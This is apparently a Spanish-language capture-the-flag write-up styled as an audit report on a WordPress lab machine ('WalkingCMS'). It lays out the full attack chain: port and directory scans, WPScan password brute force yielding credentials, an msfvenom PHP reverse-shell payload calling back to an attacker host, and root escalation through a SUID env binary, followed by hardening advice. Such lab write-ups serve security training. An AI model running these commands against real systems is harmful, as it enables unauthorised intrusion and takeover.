🛡️ REPORTE DE AUDITORÍA: WalkingCMS (172.17.0.2)
📊 RESUMEN
Compromiso total del servidor 172.17.0.2.

Se explotó una mala gestión de credenciales en WordPress y una configuración insegura del bit SUID en el binario env, permitiendo escalar privilegios de www-data a root.

🔍 1. FASE DE RECONOCIMIENTO
🌐 Escaneo de Puertos y Servicios
Bash
nmap -p- --open -sS -sC -sV -T4 -n -vvv -O -Pn 172.17.0.2
📌 Hallazgos
Puerto 80/tcp abierto

Apache 2.4.57 (Debian) - Sistema Linux (posible Docker por TTL 64)

📂 Enumeración de Directorios (Gobuster)
🔹 Fase 1: Raíz
Bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x html,php,txt,py,sh,log,zip,old,bak
Resultado:

/wordpress (301)

🔹 Fase 2: /wordpress
Bash
gobuster dir -u http://172.17.0.2/wordpress -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x html,php,txt,py,sh,log,zip,old,bak
📌 Hallazgos
/wp-admin

/wp-login.php

/xmlrpc.php

🛠️ 2. GANANDO ACCESO (EXPLOTACIÓN)
🔐 Fuerza bruta con WPScan
Bash
wpscan --url http://172.17.0.2/wordpress --usernames mario --passwords /usr/share/wordlists/rockyou.txt --force
📌 Credenciales obtenidas
mario : love
💻 Ejecución de Código Remoto (RCE)
Generación del payload
Bash
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=4444 -f raw > pwned.php
📌 Resultado
www-data
📈 3. ESCALADA DE PRIVILEGIOS
🔎 Enumeración SUID
Bash
find / -perm -u=s -type f 2>/dev/null
📌 Binario vulnerable
/usr/bin/env
⚡ Explotación
Bash
/usr/bin/env /bin/bash -p
📌 Resultado
root
📸 EVIDENCIAS
Nmap → Puerto 80 abierto

Gobuster → /wordpress y endpoints

WPScan → Credenciales válidas

Reverse shell → www-data

PrivEsc → root

🛡️ RECOMENDACIONES
🔧 Sistema
Bash
chmod u-s /usr/bin/env
🔒 WordPress
PHP
define('DISALLOW_FILE_EDIT', true);
🔑 Credenciales
Usar contraseñas robustas.

Implementar MFA.

🧠 CONCLUSIÓN
Cadena de ataque: Enumeración → Fuerza bruta → RCE (Editor Temas) → SUID PrivEsc.

➡️ Compromiso total del sistema
